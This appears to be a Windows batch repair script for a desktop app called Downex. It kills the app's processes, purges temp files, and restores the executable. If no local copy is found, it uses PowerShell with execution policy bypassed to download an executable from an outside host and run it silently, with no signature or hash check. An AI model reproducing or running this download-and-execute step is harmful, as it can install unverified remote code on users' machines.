@echo off
setlocal enabledelayedexpansion
title Downex Autonomous Self-Healing Repair Tool
color 0A

echo ======================================================================
echo           Downex Autonomous Self-Healing Client Repair Tool
echo ======================================================================
echo.

echo [1/4] Terminating any running Downex or WebView2 background processes...
taskkill /F /IM Downex.exe /T >nul 2>&1
taskkill /F /IM downex.exe /T >nul 2>&1
timeout /t 1 /nobreak >nul

set "TARGET_DIR=%LOCALAPPDATA%\Downex"
set "TARGET_EXE=%TARGET_DIR%\Downex.exe"
set "TEMP_DIR=%LOCALAPPDATA%\Temp\com.downex.manager"

echo [2/4] Purging corrupt legacy rollback and temporary files...
if exist "%TARGET_DIR%\Downex.exe.old" del /f /q "%TARGET_DIR%\Downex.exe.old" >nul 2>&1
if exist "%TARGET_DIR%\Downex.exe.tmp" del /f /q "%TARGET_DIR%\Downex.exe.tmp" >nul 2>&1
if exist "%TEMP_DIR%\watchdog_*.ps1" del /f /q "%TEMP_DIR%\watchdog_*.ps1" >nul 2>&1

echo [3/4] Checking for local verified update package...
if exist "%TEMP_DIR%\downex-v0.0.14.staged.exe" (
    echo   Found verified local stage: downex-v0.0.14.staged.exe
    copy /y "%TEMP_DIR%\downex-v0.0.14.staged.exe" "%TARGET_EXE%" >nul
    echo   Successfully restored Downex.exe from verified local package.
) else (
    echo   Fetching latest verified production build from GPHost...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://gphost.eu.cc/raw/downex-desktop' -OutFile '%TEMP_DIR%\base-setup.exe'; Start-Process '%TEMP_DIR%\base-setup.exe' -ArgumentList '/S' -Wait"
    echo   Successfully re-synchronized from Base foundation.
)

echo [4/4] Launching clean Downex application...
if exist "%TARGET_EXE%" (
    start "" "%TARGET_EXE%" --restarted-after-repair
    echo.
    echo ======================================================================
    echo   [SUCCESS] Downex has been restored to clean operational health!
    echo ======================================================================
) else (
    echo.
    echo   [ERROR] Could not locate %TARGET_EXE%. Please run the Base installer.
)

echo.
timeout /t 3 /nobreak >nul
exit /b 0

